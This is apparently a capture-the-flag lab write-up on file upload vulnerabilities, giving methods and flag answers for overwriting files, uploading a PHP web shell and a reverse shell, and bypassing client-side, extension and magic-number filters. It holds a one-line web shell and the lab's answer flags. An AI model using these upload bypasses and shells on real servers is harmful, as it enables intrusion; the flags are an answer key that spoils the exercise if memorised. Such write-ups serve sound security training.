### Overwriting existing files

Question 1: What's the name of the image file which can be overwritten?

method: inspect the page of overwrite.uploadvulns.thm 
 
answer: mountains.jpg

Question 2: Overwrite the image. What's the flag you receive?

method: upload a file called mountains.jpg

answer: THM{OTBiODQ3YmNjYWZhM2UyMmYzZDNiZjI5}

### RCE

Question 1: What directory looks like it might be used for uploads?

method: Run a gobuster scan against shell.uploadvulns.thm 
`gobuster -u shell.uploadvulns.thm -w directory-list-2.3-medium.txt`

answer: /resources

Question 2: Get a web shell or reverse shell on the machine. What is the flag
in /var/www?

method 1: Make a webshell file `<?php> echo system($_GET["cmd"]); ?>` and upload to the 
/resources folder. Call the shell with the cmd parameter set:
`shell.uploadvuln.thmn/resources/shell.php?cmd=cat /var/www/flag.txt`

mehtod 2: Upload a php reverse shell (pentestmonkey) with the correct ip and port number to
the /resources folder. Start a netcat listener on your machine on the specified port then 
navigate to `shell.uploadvuln.thmn/resources/reverse-shell.php`

answer: THM{YWFhY2U3ZGI4N2QxNmQzZjk0YjgzZDZk}

### Bypassing Client-Side Filtering

Bypass CLient-side filters:

1. Turn off javascript in youre browser
2. Intercept and modify the incoming page top remove the filter
3. Intercept and modify the file upload
4. Send the file directly to the upload point e.g 
`curl -X POST-F "submit:<value>" -F "<file-parameter>:@<path-to-file>" <site>` 

Question 1: What's the flag in /var/www?

method 1: Using gobuster find the upload directory `/images`. Intercept the response to the 
browser's GET request to load the page and delete the tags for the client side filter js 
file: `<script>client-side-filter.js<script/>`

Upload our reverse shell `shell.php` and set up a netcat listener on our machine then 
navigate to the shell in our browser executing our reverse shell

method 2: Using gobuster find the upload directory `/images`. Rename our shell to shell.png,
upload the renamed file and intercept the upload. Edit the MIME header to `text/x-php` and 
the file extension to .php then navigate to the shell in our browser executing the reverse 
shell

answer: THM{NDllZDQxNjJjOTE0YWNhZGY3YjljNmE2}

### Bypassing Server-Side Filtering: File Extensions

1. Determine restrictions on file uploads
2. Try alternate file extensions (.php3, .php4, .php5, .php7, .phps, .php-s, .pht and 
.phar)
3. Try multiple extensions on a file e.g shell.jpg.php

Question 1: What's the flag in /var/www?

method: Using gobuster find the upload directory `/privacy`. Select a reverse shell file 
renamed to use .png extension. Upload the file and intercept the request. Change the MIME 
type to text/x-php and add a .php5 extension to the file. Navigate to the reverse shell
in browser executing the reverse shell

answer: THM{MGEyYzJiYmI3ODIyM2FlNTNkNjZjYjFl}

### Bypassing Server-Side Filtering: Magic Numbers

- Identify file magic numbers with `file`
- Find them on [Wikipedia](https://en.wikipedia.org/wiki/List_of_file_signatures)
- Change them with `hexeditor`

Question 1: What's the flag in /var/www?

method: Using gobuster find the upload directory `/graphics`. Edit the reverse shell
file with hexeditor, adding the magic number for GIFs. Upload the reverse shell and navigate
to it in browsaer executing the reverse shell

answer: THM{MWY5ZGU4NzE0ZDlhNjE1NGM4ZThjZDJh}

### Example Methodology


